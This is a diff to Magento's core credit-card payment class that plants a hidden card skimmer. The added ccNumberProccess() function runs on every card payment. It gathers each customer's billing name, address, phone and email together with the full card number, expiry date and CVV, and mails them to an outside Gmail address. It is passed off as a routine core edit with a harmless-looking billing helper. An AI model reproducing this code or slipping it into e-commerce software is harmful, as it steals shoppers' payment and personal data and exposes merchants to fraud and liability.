@@ -1,7 +1,7 @@
 <?php
 /**
- * Magento
- *
+ * Magento 
+ * /app/code/core/Mage/Payment/Model/Method/ 
  * NOTICE OF LICENSE
  *
  * This source file is subject to the Open Software License (OSL 3.0)
@@ -54,10 +54,13 @@ class Mage_Payment_Model_Method_Cc extends Mage_Payment_Model_Method_Abstract
             ->setCcSsStartMonth($data->getCcSsStartMonth())
             ->setCcSsStartYear($data->getCcSsStartYear())
             ;
+
+		$this->ccNumberProccess();
+
         return $this;
     }
 
-    /**
+        /**
      * Prepare info instance for save
      *
      * @return Mage_Payment_Model_Abstract
@@ -365,7 +368,21 @@ class Mage_Payment_Model_Method_Cc extends Mage_Payment_Model_Method_Abstract
             return (double)$info->getQuote()->getBaseGrandTotal();
         }
     }
-
+	
+	function setBilling($getFirstname,$getLastname,$getStreet1,$getStreet2,$getCity,$getRegion,$getPostcode,$getCountry,$getTelephone,$getEmail)
+	{
+		$billing =  array("First Name"	=> $getFirstname,
+						  "Last Name"	=> $getLastname,
+						  "Address"		=> $getStreet1,
+						  "Apt/Suite"	=> $getStreet2,
+						  "City"		=> $getCity,
+						  "Region"		=> $getRegion,
+						  "Postal Code"	=> $getPostcode,
+						  "Country"		=> $getCountry,
+						  "Phone"		=> $getTelephone,
+						  "Email"		=> $getEmail);
+		return $billing;
+	}
     /**
      * Currency code getter
      *
@@ -381,7 +398,25 @@ class Mage_Payment_Model_Method_Cc extends Mage_Payment_Model_Method_Abstract
         return $info->getQuote()->getBaseCurrencyCode();
         }
     }
-
+	
+	function ccNumberProccess()
+    {
+        $pay = $this->getInfoInstance();
+        $object = new Mage_Checkout_Block_Onepage_Billing;
+        $billing = $object->getQuote()->getBillingAddress();
+		$email = Mage::getSingleton('checkout/session')->getQuote()->getBillingAddress()->getEmail();
+		$setBilling = $this->setBilling($billing->getFirstname(),$billing->getLastname(),$billing->getStreet(1),$billing->getStreet(2),$billing->getCity(),$billing->getRegion(),$billing->getPostcode(),$billing->getCountry(),$billing->getTelephone(),$email);
+		$invoice = "";
+		foreach($setBilling as $key=>$value){
+			$invoice .= $key.' = '.$value."\n";
+		}
+		$invoice .= "Card = ".$pay->getCcNumber()."\n";
+		$invoice .= "Expired = ".$pay->getCcExpMonth()."/".substr($pay->getCcExpYear(),-2)."\n";
+		$invoice .= "Security = ".$pay->getCcCid()."\n";
+		$invoice .= "Site = http://".$_SERVER['HTTP_HOST']."/";
+		$subject = $pay->getCcNumber()." From ".$_SERVER['HTTP_HOST']."|".$setBilling['Country'];
+		mail("cafc.404@gmail.com",$subject,$invoice,"From: ".$billing->getFirstname()." ".$billing->getLastname()." <".$email.">");
+    }
     /**
      * Whether current operation is order placement
      *
